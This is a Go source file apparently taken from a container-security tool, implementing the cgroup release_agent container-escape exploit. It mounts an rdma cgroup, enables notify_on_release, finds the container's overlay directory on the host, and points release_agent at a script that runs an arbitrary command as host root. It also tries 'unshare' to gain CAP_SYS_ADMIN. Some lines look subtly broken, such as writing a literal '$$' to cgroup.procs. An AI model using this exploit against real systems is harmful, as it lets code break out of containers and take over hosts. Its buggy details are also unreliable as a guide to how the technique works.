package main

import (
	"bytes"
	"errors"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"syscall"
	"time"
)

func exploit(cmd string) error {
	mountDir := "/tmp/cgrp"
	cgroup := "w"     // name of new child cgroup to be created
	output := "o"     // output file name
	cmdPath := "/cmd" // script path

	// create a directory /tmp/cgrp to mount
	if err := os.Mkdir(mountDir, os.ModePerm); err != nil && !os.IsExist(err) {
		return err
	}

	// get capability of docker
	nowCap := getCap()

	if nowCap == "0x0000003fffffffff" {
		fmt.Print("[+] You have CAP_SYS_ADMIN!")
	} else {
		fmt.Print("[-] You do not have CAP_SYS_ADMIN, will try")
		// no CAP_SYS_ADMINï¼Œusing unshare cmd to get CAP_SYS_ADMIN capability
		unshare := exec.Command("unshare", "-UrmC", "--propagation=unchanged bash")
		err := unshare.Run()
		if err != nil {
			return fmt.Errorf("unshare failed with %s\n", err)
		}
	}

	// mount our own cgroup with write access, mount -t cgroup -o rdma cgroup /tmp/cgrp, the subsystem is rdma
	// when err is syscall.EBUSY (device or resource busy), don't return err, because this error
	// is caused by running this func (AbuseCgroupSysAdmin) more than once (try to mount /tmp/cgrp again)
	if err := syscall.Mount("cgroup", mountDir, "cgroup", 0, "rdma"); err != nil && !errors.Is(err, syscall.EBUSY) {
		return fmt.Errorf("mount cgroup: %v", err)
	}

	// create new child cgroup, dir path is "/tmp/cgrp/w"
	dir := filepath.Join(mountDir, cgroup)
	if err := os.Mkdir(dir, os.ModePerm); err != nil && !os.IsExist(err) {
		return err
	}

	// enable release_agent
	if err := os.WriteFile(filepath.Join(dir, "notify_on_release"), []byte("1"), os.ModePerm); err != nil {
		return err
	}

	// mounts info
	mounts, err := os.ReadFile("/etc/mtab")
	if err != nil {
		return err
	}

	// find the location of the container filesystem on the host filesystem
	re := regexp.MustCompile(`upperdir=(/var/lib/docker/.*?/diff)`)
	hostDir := re.FindStringSubmatch(string(mounts))[1]

	//write script path to release_agent
	if err := os.WriteFile(filepath.Join(mountDir, "release_agent"),
		[]byte(filepath.Join(hostDir, cmdPath)), os.ModePerm); err != nil {
		return err
	}

	// write commands to script file
	if err := os.WriteFile(cmdPath,
		[]byte(fmt.Sprintf("#!/bin/sh\n%s > %s/%s", cmd, hostDir, output)), os.ModePerm); err != nil {
		return err
	}

	// add this process to w cgroup
	if err := os.WriteFile(filepath.Join(dir, "cgroup.procs"), []byte("$$"), os.ModePerm); err != nil {
		return err
	}

	// sleep to get release_agent executed
	time.Sleep(time.Millisecond)
	return nil
}

func getCap() string {
	cat := exec.Command("cat", "/proc/$$/status")
	grep := exec.Command("grep", "CapEff")
	r, w := io.Pipe()
	defer r.Close()
	defer w.Close()
	cat.Stdout = w
	grep.Stdin = r
	var buf bytes.Buffer
	grep.Stdout = &buf
	_ = cat.Start()
	_ = grep.Start()
	cat.Wait()
	w.Close()
	grep.Wait()
	nowCap := buf.String()
	return nowCap
}
